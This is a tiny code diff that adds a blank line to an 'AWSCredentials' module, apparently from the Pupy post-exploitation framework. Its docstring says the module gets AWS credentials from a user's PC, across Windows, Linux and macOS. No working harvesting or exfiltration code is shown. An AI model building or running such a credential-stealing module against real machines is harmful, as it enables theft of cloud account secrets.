@@ -6,6 +6,7 @@ from pupylib.PupyModule import *
 
 __class_name__ = "AWSCredentials"
 
+
 @config(compatibilities=['windows', 'linux', 'darwin'], category="creds")
 class AWSCredentials(PupyModule):
     """Get AWS credntials from a users pc"""
